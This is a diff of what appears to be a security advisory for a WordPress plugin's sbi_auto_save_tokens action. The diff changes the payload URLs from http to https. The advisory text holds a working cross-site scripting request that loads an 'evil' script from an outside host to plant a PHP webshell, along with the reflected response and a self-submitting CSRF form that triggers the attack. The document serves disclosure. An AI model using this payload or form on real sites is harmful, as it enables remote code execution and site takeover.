@@ -58,7 +58,7 @@ page with attacker-controlled content.
   Cookie: ...
   Connection: close
 
-  action=sbi_auto_save_tokens&amp;access_token=&lt;script src=http://dumpco.re/evil/wordpressxss2rce.js&gt;&lt;/script&gt;
+  action=sbi_auto_save_tokens&amp;access_token=&lt;script src=https://dumpco.re/evil/wordpressxss2rce.js&gt;&lt;/script&gt;
 
 The example request above results in the following response:
 
@@ -67,11 +67,11 @@ The example request above results in the following response:
   Connection: close
   Content-Type: text/html; charset=UTF-8
 
-  &lt;script src=http://dumpco.re/evil/wordpressxss2rce.js&gt;&lt;/script&gt;
+  &lt;script src=https://dumpco.re/evil/wordpressxss2rce.js&gt;&lt;/script&gt;
 
 In the example above, the XSS payload attempts to upload a malicious PHP webshell,
 resulting in remote code execution (RCE) if successful. A description of the
-payload can be found here: http://dumpco.re/blog/xss2rce
+payload can be found here: dumpco.re/blog/xss2rce
 
 The following self-submitting form can be used to trigger the vulnerability:
 
@@ -79,7 +79,7 @@ The following self-submitting form can be used to trigger the vulnerability:
     &lt;body&gt;
       &lt;form action="http://example.com/wp-admin/admin-ajax.php" method="POST"&gt;
         &lt;input type="hidden" name="action" value="sbi&amp;#95;auto&amp;#95;save&amp;#95;tokens" /&gt;
-        &lt;input type="hidden" name="access&amp;#95;token" value="&amp;lt;script&amp;#32;src&amp;#61;http&amp;#58;&amp;#47;&amp;#47;dumpco&amp;#46;re&amp;#47;evil&amp;#47;wordpressxss2rce&amp;#46;js&amp;gt;&amp;lt;&amp;#47;script&amp;gt;" /&gt;
+        &lt;input type="hidden" name="access&amp;#95;token" value="&amp;lt;script&amp;#32;src&amp;#61;https&amp;#58;&amp;#47;&amp;#47;dumpco&amp;#46;re&amp;#47;evil&amp;#47;wordpressxss2rce&amp;#46;js&amp;gt;&amp;lt;&amp;#47;script&amp;gt;" /&gt;
         &lt;input type="submit" value="Submit request" /&gt;
       &lt;/form&gt;
     &lt;/body&gt;
